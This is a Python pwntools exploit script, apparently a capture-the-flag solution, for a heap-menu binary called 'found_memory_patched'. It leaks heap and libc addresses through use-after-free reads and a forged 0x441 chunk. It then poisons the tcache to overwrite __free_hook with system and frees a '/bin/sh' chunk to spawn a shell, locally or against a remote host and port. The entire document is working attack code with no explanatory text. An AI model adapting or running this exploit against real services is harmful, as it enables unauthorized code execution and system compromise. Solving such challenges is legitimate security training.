#!/usr/bin/env python3

from pwn import *

exe = ELF("./found_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'
gs = '''
set max-visualize-chunk-size 100
'''

def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))

    return p

p = init()

def alloc():
    p.sendlineafter(b"> ", str(1))

def free(idx):
    p.sendlineafter(b"> ", str(2))
    p.sendlineafter(b"free: ", str(idx))

def show(idx):
    p.sendlineafter(b"> ", str(3))
    p.sendlineafter(b"view: ", str(idx))

def edit(idx, content):
    p.sendlineafter(b"> ", str(4))
    p.sendlineafter(b"edit: ", str(idx))
    p.sendafter(b"data: ", content)

# leak heap:
for i in range(20):
    alloc()
free(1)
free(0)
show(0)
leak_heap = u64(p.recv(6).ljust(8, b"\00"))
heap_base = leak_heap - 0x2e0
log.info(f"heap base: {hex(heap_base)}")

# leak libc
payload = flat(
    p64(heap_base+0x310),
)
edit(0, payload)
alloc()
alloc()
payload = flat(
    p64(0),
    p64(0x441),
)
edit(1, payload)
free(2)
show(2)
leak_libc = u64(p.recv(6).ljust(8, b"\00"))
libc_base = leak_libc - (libc.sym.main_arena + 96)
system = libc_base + libc.sym.system
__free_hook = libc_base + libc.sym.__free_hook
log.info(f"libc base: {hex(libc_base)}")
# overwrite free hook
alloc()
alloc()
alloc()

free(21)
free(20)
edit(20, p64(__free_hook))
alloc()
alloc()
edit(21, p64(system))
alloc()
edit(22, b"/bin/sh\00")
free(22)

p.interactive()
